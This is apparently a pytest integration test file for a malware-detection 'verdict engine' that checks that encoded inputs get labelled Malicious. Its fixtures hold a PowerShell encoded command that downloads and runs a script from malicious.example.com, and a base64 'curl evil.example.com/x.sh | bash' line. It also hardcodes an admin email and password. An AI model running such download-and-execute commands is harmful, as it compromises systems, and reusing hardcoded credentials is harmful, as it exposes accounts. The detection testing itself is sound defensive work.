"""
P1-02b Verdict Engine Integration Tests
Tests the unified tiered verdict engine via public backend API.
"""
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
if not BASE_URL:
    with open("/app/frontend/.env") as f:
        for line in f:
            if line.startswith("REACT_APP_BACKEND_URL="):
                BASE_URL = line.split("=", 1)[1].strip().rstrip("/")

# Fall back to local backend if the public ingress is slow/502 during CI.
# Ingress → 8001 rewrite for /api routes; hitting 8001 directly bypasses cloudflare timeouts.
LOCAL_BASE = "http://127.0.0.1:8001"

# PowerShell EncodedCommand payload: IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/p.ps1')
PS_ENCODED = (
    "powershell -nop -w hidden -EncodedCommand "
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkA"
    "bwB1AHMALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA=="
)


def _login(url):
    return requests.post(
        f"{url}/api/auth/login",
        json={"email": "admin@nivxray.com", "password": "uulVDp5cCSB3Hva99s7UUAwK"},
        timeout=120,
    )


def _admin_token():
    global BASE_URL
    # Try LOCAL first (fast) then public URL
    for candidate in [LOCAL_BASE, BASE_URL]:
        try:
            r = _login(candidate)
            if r.status_code == 200:
                BASE_URL = candidate
                j = r.json()
                tok = j.get("access_token") or j.get("token")
                if tok:
                    return tok
        except Exception:
            continue
    pytest.skip("Login failed on both public and local URLs")


@pytest.fixture(scope="module")
def auth_headers():
    tok = _admin_token()
    return {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}


def _post(path, payload, headers=None):
    return requests.post(f"{BASE_URL}{path}", json=payload, headers=headers, timeout=180)


def _validate_contributor(c):
    """Every contributor must have these fields."""
    required = ["node_id", "kind", "weight", "confidence", "category", "label",
                "evidence_class", "source"]
    for k in required:
        assert k in c, f"contributor missing field '{k}': {c}"
    # escalated_by may be null but key must exist
    assert "escalated_by" in c, f"contributor missing 'escalated_by' key: {c}"


def _extract_cio(resp_json):
    # smart decode / auto-investigate may nest cio; try multiple locations
    if "cio" in resp_json:
        return resp_json["cio"]
    if "result" in resp_json and isinstance(resp_json["result"], dict) and "cio" in resp_json["result"]:
        return resp_json["result"]["cio"]
    return resp_json


class TestSmartDecodeVerdict:
    def test_powershell_encoded_becomes_malicious(self, auth_headers):
        r = _post("/api/decode/smart", {"input": PS_ENCODED}, auth_headers)
        assert r.status_code == 200, r.text
        cio = _extract_cio(r.json())
        verdict = cio.get("verdict", {})
        assert verdict.get("label") == "Malicious", f"verdict={verdict}"
        assert verdict.get("confidence_pct", 0) >= 90, f"confidence too low: {verdict}"
        assert verdict.get("engine") == "unified-verdict-engine-v1", f"engine={verdict.get('engine')}"
        # contributors validation
        contributors = verdict.get("contributors", [])
        assert len(contributors) >= 1, "no contributors"
        classes = set()
        sources = set()
        for c in contributors:
            _validate_contributor(c)
            classes.add(c.get("evidence_class"))
            sources.add(c.get("source"))
        # must include at least some tiered evidence classes
        valid_classes = {"critical", "high", "medium", "low", "context"}
        assert classes & valid_classes, f"no tiered classes in contributors: {classes}"
        # source must be graph or metadata:*
        assert any(s == "graph" or (isinstance(s, str) and s.startswith("metadata:"))
                   for s in sources), f"unexpected sources: {sources}"

    def test_osint_metadata_populated(self, auth_headers):
        """P1-01 coexistence: osint metadata still present."""
        r = _post("/api/decode/smart", {"input": PS_ENCODED}, auth_headers)
        assert r.status_code == 200
        cio = _extract_cio(r.json())
        metadata = cio.get("metadata", {})
        assert "osint" in metadata, f"metadata missing osint key. keys={list(metadata.keys())}"
        # osint should be a dict/list (not necessarily populated w/ hits due to no live keys)
        osint = metadata["osint"]
        assert osint is not None

    def test_benign_input_undetermined_or_informational(self, auth_headers):
        r = _post("/api/decode/smart", {"input": "echo hello"}, auth_headers)
        assert r.status_code == 200
        cio = _extract_cio(r.json())
        verdict = cio.get("verdict", {})
        label = verdict.get("label")
        assert label in ("Undetermined", "Informational"), f"expected benign, got {label}"
        assert verdict.get("confidence_pct", 100) < 30, f"benign confidence too high: {verdict}"


class TestAutoInvestigateParity:
    def test_workspace_xlab_verdict_parity(self, auth_headers):
        r1 = _post("/api/decode/smart", {"input": PS_ENCODED}, auth_headers)
        r2 = _post("/api/v2/auto-investigate", {"incident_text": PS_ENCODED}, auth_headers)
        assert r1.status_code == 200, r1.text
        assert r2.status_code == 200, r2.text
        cio1 = _extract_cio(r1.json())
        cio2 = _extract_cio(r2.json())
        v1 = cio1.get("verdict", {})
        v2 = cio2.get("verdict", {})
        assert v1.get("label") == v2.get("label"), (
            f"parity broken: smart={v1.get('label')} vs auto={v2.get('label')}"
        )
        assert v1.get("engine") == "unified-verdict-engine-v1"
        assert v2.get("engine") == "unified-verdict-engine-v1"
        # matching evidence classes
        c1 = {c.get("evidence_class") for c in v1.get("contributors", [])}
        c2 = {c.get("evidence_class") for c in v2.get("contributors", [])}
        assert c1 == c2 or c1 & c2, f"evidence classes diverge: {c1} vs {c2}"


class TestContributorSchema:
    def test_all_contributors_have_required_fields(self, auth_headers):
        r = _post("/api/decode/smart", {"input": PS_ENCODED}, auth_headers)
        assert r.status_code == 200
        cio = _extract_cio(r.json())
        contributors = cio.get("verdict", {}).get("contributors", [])
        assert contributors, "no contributors to validate"
        for c in contributors:
            _validate_contributor(c)


class TestRecipeEscalation:
    def test_custom_recipe_triggers_malicious(self, auth_headers):
        # base64-encoded curl download string -> should trigger decoder recipes + ioc-extract
        # "curl http://evil.example.com/x.sh | bash"
        payload = "Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS94LnNoIHwgYmFzaA=="
        r = _post("/api/decode/smart", {"input": payload}, auth_headers)
        assert r.status_code == 200, r.text
        cio = _extract_cio(r.json())
        verdict = cio.get("verdict", {})
        label = verdict.get("label")
        # Acceptable: Malicious via escalation or CRITICAL class
        assert label in ("Malicious", "Suspicious"), f"expected escalation, got {label}: {verdict}"
